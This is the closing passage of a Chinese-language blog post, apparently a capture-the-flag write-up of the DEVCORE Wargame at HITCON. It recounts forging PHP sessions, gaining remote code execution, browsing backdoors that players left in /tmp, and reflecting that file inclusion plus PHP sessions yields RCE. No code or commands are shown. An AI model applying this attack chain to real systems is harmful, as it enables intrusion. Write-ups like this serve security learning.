        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638340322/blog-posts/2021-12/01-flag6.webp"
        title=" " /></p>
<p>看起來寫得很精簡，但這部分花掉了我整個晚上的時間，尤其蓋 session 一直蓋爛，然後經驗太少又沒有 debug 方向，感謝 @stavhaygn 耐心的指引，後面燒掉好多腦細胞QwQ</p>
<p>之後用 RCE 跑去翻 <code>/tmp/</code>，除了 session 還有很多其他人遺留的後門，我也留名做個紀念（順便清掉自己留的一堆爛掉ㄉ測試檔）XDDD
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638340331/blog-posts/2021-12/01-backdoor.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638340331/blog-posts/2021-12/01-backdoor.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638340331/blog-posts/2021-12/01-backdoor.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638340331/blog-posts/2021-12/01-backdoor.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638340331/blog-posts/2021-12/01-backdoor.webp"
        title=" " /></p>
<h2 id="後記">後記</h2>
<p>不得不說這種用 flag 逐步解鎖滲透報告的想法，個人覺得很棒。而且整個過程也都有脈絡可循，只是經驗不夠還是很容易像我通靈亂戳，要需要找人求救 QQ。在會場和 DEVCORE 交流時得知其實題目整組就是 RCE 的連續技，只是在滲透的過程中會撿到 Flag，很喜歡這種學技術的感覺，只是若要自己重現系統環境感覺不容易，不然放到自架的 CTFd 感覺應該很不錯。</p>
<p>此外就是體會到 LFI 的嚴重性，過去打 CTF 都只覺得危險程度在機敏資料外洩，沒想到搭配 PHP Sessions 可以做出 RCE ，直接把手伸進系統內真的好可怕&gt;&quot;&lt;</p>
<p>最後附上官方用心製作的滲透測試報告XD</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638293282/blog-posts/2021-12/01-challenge.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638293282/blog-posts/2021-12/01-challenge.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638293282/blog-posts/2021-12/01-challenge.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638293282/blog-posts/2021-12/01-challenge.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638293282/blog-posts/2021-12/01-challenge.webp"
        title=" " /></p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2021-12-01</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hitcon/">HITCON</a>,&nbsp;<a href="/tags/devcore-wargame/">DEVCORE Wargame</a>,&nbsp;<a href="/tags/penetration-test/">Penetration Test</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/2021/hitcon-education-defense-2021/" class="prev" rel="prev" title="[Sharing] HITCON Education Defense 2021"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[Sharing] HITCON Education Defense 2021</a>
            <a href="/posts/2022/nsysuisc-intranet-penetration/" class="next" rel="next" title="[NSYSU 資安社課] Intranet Penetration">[NSYSU 資安社課] Intranet Penetration<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="utterances" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.125.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://blog.cyris.tw" target="_blank">Cyris Tseng</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":20},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"Comment 💬","lightTheme":"github-light","repo":"yctseng1227/blog-comments"}}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
